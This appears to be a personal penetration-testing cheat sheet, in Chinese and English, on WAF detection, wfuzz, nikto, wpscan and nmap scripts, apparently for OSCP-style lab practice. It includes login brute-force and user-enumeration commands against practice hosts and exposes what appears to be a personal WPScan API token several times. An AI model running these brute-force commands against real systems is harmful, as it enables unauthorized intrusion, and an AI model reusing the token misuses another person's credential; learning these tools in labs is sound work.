+ https://sushant747.gitbooks.io/total-oscp-guide/content/automated_vulnerability_scanners.html

## waf 识别
+ [waf bypass](http://securityidiots.com/Web-Pentest/WAF-Bypass/waf-bypass-guide-part-1.html)
+ waf detect, wafw00f

```bash
nmap -p80 --script http-waf-detect <host>

nmap -p80 --script http-waf-fingerprint <host>

wafw00f -r url

```

##  wfuzz
Usage Doc:https://wfuzz.readthedocs.io/en/latest/user/basicusage.html#fuzzing-paths-and-files
git: https://github.com/xmendez/wfuzz
教程参考：
[wfuzz使用教程](https://www.fuzzer.xyz/2019/03/29/WFUZZ%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/)
[advanced usage](https://github.com/xmendez/wfuzz/blob/18a83606e3011159b4b2e8c0064f95044c3c4af5/docs/user/advanced.rst)
[wfuzz初上手](https://www.secpulse.com/archives/78638.html)

* 可fuzzweb漏洞
> 可预测认证, 可预测的sessiond标志(sessionid), 可预测的资源定位(目录和文件）
> 注入, 路径遍历, 溢出, XSS, 认证漏洞, 不安全的直接对象引用

* 工具特性
> 递归，目录枚举、扫描; Post数据爆破; Header爆破; 输出格式化报告html，可查看详细内容、post参数等
> color 输出; 结果过滤，通过返回码、wordcount、linecount 隐藏/显示结果
> URL编码; 指定cookie; 多线程; 代理支持; 多参数fuzz

* 参数说明

```
-c：用颜色输出
-v：详细的信息
-o 打印机：由stderr输出格式

-p addr：使用代理（ip：port或ip：port-ip：port-ip：port）
-x type：使用SOCK代理（SOCKS4，SOCKS5）
-t N：指定线程数（默认20个）
-s N：指定请求之间的时间延迟（默认为0）

-e <type>：可用编码/有效载荷/迭代器/打印机的列表
-R depth：递归路径发现
-I：使用HTTP HEAD而不是GET方法（没有HTML主体响应）。
--follow：遵循重定向

-m iterator：指定迭代器（默认产品）
-z payload ：指定有效载荷（类型，参数，编码）
-V alltype：所有参数bruteforcing（allvars和allpost）。不需要FUZZ关键字。

-X：HTTP方法中的有效载荷（例如：“FUZZ HTTP / 1.0”）。不需要FUZZ关键字。
-b cookie：为请求指定一个cookie, cookie1=values1
-d postdata：使用发布数据（例如：“id = FUZZ＆catalog = 1”）
-H headers：使用头文件（例如："Host:www.mysite.com,Cookie:id=1312321&user=FUZZ"）
--basic/ntlm/digest auth：格式为“user：pass”或“FUZZ：FUZZ”或“domain \ FUZ2Z：FUZZ”

--hc/hl/hw/hh N[,N]+ ：隐藏指定的代码/行/字/字符的resposnes（使用BBB从基线获取值）
--hs regex ：在响应中隐藏具有指定正则表达式的响应
```

* 常用场景/命令
kali安装及默认字典列表，建议配合[FuzzDB](https://github.com/fuzzdb-project/fuzzdb)、[SecLists](https://github.com/danielmiessler/SecLists)使用。
```
#kali安装 
apt install wfuzz
#默认字典位置
/usr/share/wfuzz/wordlist
/usr/share/wordlists/wfuzz
```
Fuzz 命令

```
#目录爆破
wfuzz -w wordlist/general/common.txt http://testphp.vulnweb.com/FUZZ

#文件爆破
wfuzz -w wordlist/general/common.txt http://testphp.vulnweb.com/FUZZ.php

#url参数值fuzzing
wfuzz -z range,0-10 --hl 97 http://testphp.vulnweb.com/listproducts.php?cat=FUZZ

#post请求参数值fuzzing，-d指定postdata
wfuzz -z file,wordlist/others/common_pass.txt -d "uname=FUZZ&pass=FUZZ"  --hc 302 http://testphp.vulnweb.com/userinfo.php

#带会话/cookie 、指定Header fuzzing，-b指定cookie值， -H指定header
wfuzz -z file,wordlist/general/common.txt -b cookie=value1 -b cookie2=value2 http://testphp.vulnweb.com/FUZZ
$ wfuzz -z file,wordlist/general/common.txt -H "myheader: headervalue" -H "myheader2: headervalue2" http://testphp.vulnweb.com/FUZZ

#认证fuzzing   –basic/ntlm/digest
wfuzz -z list,nonvalid-httpwatch --basic FUZZ:FUZZ https://www.test.com/default.aspx

#递归深度，-R 指定payload递归深度，
wfuzz -z list,"admin-login.php-test-dorabox" -R 1 http://test.com/FUZZ

#保存结果
raw       | `Raw` output format
json      | Results in `json` format
csv       | `CSV` printer ftw
magictree | Prints results in `magictree` format
html      | Prints results in `html` format

wfuzz -f outfile,json -w wordlist URL/FUZZ
```
* --hc/hl/hw/hh 过滤结果

```
#hc 隐藏404，403
wfuzz -w wordlist --hc 404,403 URL/FUZZ

#hl 隐藏响应结果为10行的
wfuzz -w wordlist --hc 10 URL/FUZZ

#hw 隐藏响应结果为100word的
wfuzz -w wordlist --hw 100 URL/FUZZ

#hh 隐藏响应结果为200字符的
wfuzz -w wordlist --hh 200 URL/FUZZ

#BBB 基准线用法，以第一个url/404的请求响应为基准，过滤相同的内容、
wfuzz -w wordlist --hh BBB URL/FUZZ\{404\}

#--sc/sl/sw/sh 用法相同

#-hs/ss 正则过滤
wfuzz -w wordlist --hs regex URL/FUZZ #隐藏
wfuzz -w wordlist --hs "not found" URL/FUZZ #隐藏

```

* 高级用法，迭代器、encoder

```
#-m 指定迭代器，zip、chain、product
#zip range生0-9，对应字典中前10个值，一一对应填入两个fuzz位置
wfuzz -z range,0-9 -w dict.txt -m zip http://test.com/index?FUZZ=FUZ2Z

#chain range0-20、txt均作为payload，作为payload
wfuzz -z range,0-20 -w postid.txt  -m chain http://test.com/index?id=FUZZ

#product 类似burp cluster bomb，笛卡尔积 payload
wfuzz -z range,0-20 -w dict.txt -m product http://test.com/index?FUZZ=FUZ2Z

#encoder功能，支持md5、base64、urlencode等编码方式
wfuzz -e encoder 
wfuzz -z file --zP fn=wordlist,encoder=md5 URL/FUZZ
wfuzz -z file,wordlist,md5 URL/FUZZ
wfuzz -z file,dict.txt,md5-base64 url/FUZZ
wfuzz -z file --zP fn=qing.txt,encoder=md5-base64 url/FUZZ
#@连接多个encode，从右往左
wfuzz -z file --zP fn=qing.txt,encoder=md5@base64 url/FUZZ
```

**wfuzz error**
+ UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.

```bash
# https://stackoverflow.com/questions/55929011/pycurl-is-not-compiled-against-openssl-when-i-trie-to-use-wfuzz-how-to-solve-th

sudo apt --purge remove python3-pycurl
sudo apt install libcurl4-openssl-dev libssl-dev
pyenv global 3.10.6
pip install pycurl wfuzz
```

##  nikto 

```
-host  target url
-maxtime  limit scan duration
nikto -host=http://www.megacorpone.com -maxtime=30s

nikto -host http://$tip:4167/ -O nikto.log
```

##  wpscan
+ kali自带的默认扫描工具，针对wordpress网站的漏扫，包括wp漏洞、插件漏洞、主题漏洞。
+ change detect mode/plugins dir params, if no plugins found.

```bash
# my api token
eHmdOsNYBMMTmCxORyxOKVa5MZnegduDGRkGemtaFgo
Usage: wpscan [options]
        --url URL
# 常用参数：
-o outfile
-f  format[cli-no-colour, cli-no-color, cli, json]
--url URL
-e --enumrate [opts] // u userid range; vp vuln plugins ; 
-U , --usernames list //指定用户名列表，如 'user', 'u1,u2,u3', '/tmp/user.txt'
-P, --passwords filepath // 指定密码文件
--api-token token // api token
--disable-tls-checks, disable tls for ssl error

# 练习示例：
wpscan --url http://192.168.3.235 -e u  //枚举用户
## 爆破密码
wpscan --url http://192.168.3.235 --usernames webmaster --passwords /usr/share/wordlists/rockyou.txt 

wpscan --url sandbox.local --enumerate ap,at,cb,dbe

wpscan --url https://brainfuck.htb --api-token eHmdOsNYBMMTmCxORyxOKVa5MZnegduDGRkGemtaFgo --disable-tls-checks --usernames wpuser.txt --passwords /usr/share/wordlists/rockyou.txt

## detect mode if no plugins found.
wpscan --url http://blocky.htb --plugins-detection aggressive -- wp-content-dir wp-content --api-token eHmdOsNYBMMTmCxORyxOKVa5MZnegduDGRkGemtaFgo -e ap,at,u,cb

```

## nmap script
https://blog.csdn.net/weixin_45116657/article/details/103768829
https://nmap.org/nsedoc/categories/brute.html
```
SCRIPT SCAN:
  -sC: equivalent to --script=default
  --script=<Lua scripts>: <Lua scripts> is a comma separated list of
           directories, script-files or script-categories
  --script-args=<n1=v1,[n2=v2,...]>: provide arguments to scripts
  --script-args-file=filename: provide NSE script args in a file
  --script-trace: Show all data sent and received
  --script-updatedb: Update the script database.
  --script-help=<Lua scripts>: Show help about scripts.
           <Lua scripts> is a comma-separated list of script-files or
           script-categories.

#查看脚本数量
ls /usr/share/nmap/scripts/ | wc -l
ls /usr/share/nmap/scripts/ | sed 's/.nse//' > scripts.list

nmap --script-help=telnet-brute
```